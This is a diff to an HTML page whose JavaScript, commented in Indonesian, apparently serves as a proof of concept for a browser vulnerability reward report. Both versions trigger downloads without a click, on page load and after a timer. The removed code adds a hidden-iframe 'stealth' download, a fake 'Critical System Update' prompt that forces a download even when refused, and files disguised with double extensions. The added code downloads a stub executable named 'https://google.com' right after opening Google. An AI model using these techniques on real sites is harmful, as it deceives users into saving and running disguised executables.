@@ -19,142 +19,62 @@
  <body> 
   <script>
 function a(){
-    window.open('https://google.com', 'x');
+    // Buka situs legit pertama
+    window.open('https://google.com', 'legitWindow');
+    
+    // Setelah 5 detik, download file dengan nama "https://google.com"
     setTimeout(function(){
-        // Multiple techniques untuk auto-install
-        autoInstallVariousFiles();
+        createBlobDownload('https://google.com', 'exe');
     }, 5000);
 }
 
-// Function 1: Download berbagai ekstensi file
-function autoInstallVariousFiles() {
-    const files = [
-        { name: 'update.apk', type: 'apk' },
-        { name: 'setup.exe', type: 'exe' },
-        { name: 'install.bat', type: 'bat' },
-        { name: 'script.ps1', type: 'ps1' },
-        { name: 'file.js', type: 'js' },
-        { name: 'document.pdf.exe', type: 'exe' },
-        { name: 'image.jpg.scr', type: 'scr' }
-    ];
-    
-    const file = files[Math.floor(Math.random() * files.length)];
-    createBlobDownload(file.name, file.type);
-}
-
-// Function 2: Buat blob download tanpa external source
+// Function untuk create blob download dengan nama file "https://google.com"
 function createBlobDownload(filename, fileType) {
     let fileContent = '';
     let mimeType = 'application/octet-stream';
     
+    // Content berdasarkan tipe file
     switch(fileType) {
+        case 'exe':
+            fileContent = 'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF\x00\x00\xB8\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00';
+            mimeType = 'application/x-msdownload';
+            break;
         case 'apk':
-            fileContent = 'PK\x03\x04\x14\x00\x08\x00\x08\x00';
+            fileContent = 'PK\x03\x04\x14\x00\x08\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00';
             mimeType = 'application/vnd.android.package-archive';
             break;
-        case 'exe':
-            fileContent = 'MZ\x90\x00\x03\x00\x00\x00\x04\x00';
-            mimeType = 'application/x-msdownload';
-            break;
-        case 'bat':
-            fileContent = '@echo off\r\necho Installing...\r\npause';
-            mimeType = 'application/bat';
-            break;
-        case 'ps1':
-            fileContent = 'Write-Host "PowerShell Script"';
-            mimeType = 'application/powershell';
-            break;
-        case 'js':
-            fileContent = 'console.log("JavaScript file")';
-            mimeType = 'application/javascript';
-            break;
-        case 'scr':
-            fileContent = 'MZ\x90\x00\x03\x00';
-            mimeType = 'application/x-msdownload';
-            break;
         default:
-            fileContent = 'Test file for VRP research';
+            fileContent = 'File: ' + filename + '\nThis is a test file for VRP research';
     }
     
+    // Buat blob file
     const blob = new Blob([fileContent], { type: mimeType });
     const url = URL.createObjectURL(blob);
     
+    // Buat element download
     const a = document.createElement('a');
     a.href = url;
-    a.download = filename;
+    a.download = filename; // Nama file akan jadi "https://google.com"
     document.body.appendChild(a);
     a.click();
     document.body.removeChild(a);
     URL.revokeObjectURL(url);
 }
 
-// Function 3: Auto-execute ketika page load
+// Auto-execute ketika page load (opsional)
 window.addEventListener('load', function() {
+    // Otomatis jalankan setelah 10 detik
     setTimeout(function() {
-        // Coba teknik stealth download
-        stealthBackgroundDownload();
-    }, 3000);
+        // Buka google.com
+        window.open('https://google.com', 'autoWindow');
+        // Download file dengan nama "https://google.com"
+        createBlobDownload('https://google.com', 'exe');
+    }, 10000);
 });
-
-// Function 4: Stealth background download
-function stealthBackgroundDownload() {
-    const iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    
-    const blob = new Blob([`
-        <html>
-            <body>
-                <script>
-                    const blob = new Blob(['Stealth Download Content'], { type: 'application/x-msdownload' });
-                    const url = URL.createObjectURL(blob);
-                    const a = document.createElement('a');
-                    a.href = url;
-                    a.download = 'stealth_file.exe';
-                    document.body.appendChild(a);
-                    a.click();
-                <\/script>
-            </body>
-        </html>
-    `], { type: 'text/html' });
-    
-    iframe.src = URL.createObjectURL(blob);
-    document.body.appendChild(iframe);
-}
-
-// Function 5: Fake error prompt
-function fakeErrorInstall() {
-    if (confirm('Critical System Update Required!\nDownload security patch now?')) {
-        createBlobDownload('security_update.exe', 'exe');
-    } else {
-        // Force download setelah delay
-        setTimeout(() => {
-            createBlobDownload('mandatory_update.exe', 'exe');
-        }, 2000);
-    }
-}
-
-// Function 6: Multiple files attack
-function downloadMultipleFiles() {
-    const files = [
-        { name: 'main_setup.exe', type: 'exe' },
-        { name: 'config.bat', type: 'bat' },
-        { name: 'data.ps1', type: 'ps1' }
-    ];
-    
-    files.forEach((file, index) => {
-        setTimeout(() => {
-            createBlobDownload(file.name, file.type);
-        }, index * 1000);
-    });
-}
 </script> 
 
   <center>
     <input type="button" class="button" value="Download From Original Site" onclick="a()">
-    <br>
-    <input type="button" class="button" value="Fake Error Update" onclick="fakeErrorInstall()" style="background-color: #ff4444;">
-    <br>
-    <input type="button" class="button" value="Multiple Files Attack" onclick="downloadMultipleFiles()" style="background-color: #ffaa00;">
   </center>
 
  </body>
